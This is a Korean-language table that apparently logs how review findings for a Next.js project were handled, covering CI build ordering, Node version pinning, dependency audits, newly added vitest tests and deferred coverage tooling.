| 3-10 CI에 `npm run build` 없음 | **타당 (자체 확인)** | CI는 클린 체크아웃에서 `typecheck`만 돌려 Next가 생성하는 `.next/types`(LayoutProps·routes.d.ts)가 없어 실패한다. build를 typecheck 앞으로 | 예정 커밋 |
| 3-10 `.nvmrc`/`packageManager` | **부분 조치** | `.nvmrc`(24) 추가. `packageManager`는 넣지 않았다 — 이 환경의 `npm -v`가 1.3.14(Volta 심)라 corepack이 툴체인을 깨는 리스크가 있다 | 예정 커밋 |
| 3-10 Dependabot/audit 게이트 | **미조치** | dev 의존성 moderate 7건은 개발 도구 문제. 자동 PR/게이트는 별도 정책 결정 | — |
| 테스트 공백: scripts 0건 | **타당** | `main()`을 직접 실행 가드로 분리하고 `retryableStatus`/`requestChatOnce`/`balanceByDifficulty`를 export → `scripts/__tests__/build-corpus.test.mts` 9건, vitest include에 scripts 추가 | `1645eb9` |
| 테스트 공백: json 이스케이프 | **타당** | `src/lib/__tests__/json.test.ts` 7건 | `1645eb9` |
| 테스트 공백: translation-tab 지연 응답 / evaluation-card 히스토리 / review-tab 순환 / practice Quota·상한·반환값 / use-cancellable 계약 / weekly-chart | **타당** | 전부 추가(현재 23 파일 · 315개 테스트) | 각 커밋 |
| 커버리지 측정 부재 | **미조치** | `@vitest/coverage-v8` 추가는 의존성 설치(네트워크)가 필요해 보류. 임의 threshold는 오히려 노이즈 | — |
